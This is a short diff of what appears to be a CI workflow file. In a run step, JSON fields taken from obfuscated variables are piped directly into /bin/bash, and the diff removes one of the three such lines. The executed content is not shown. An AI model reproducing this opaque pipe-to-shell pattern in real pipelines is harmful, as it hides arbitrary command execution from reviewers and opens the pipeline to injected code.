@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$n23" | jq -r .xsv7269 | /bin/bash
           printf '%s' "$qw71" | jq -r .ebs54 | /bin/bash
-          echo $dl912 | jq -r .sqfg453 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
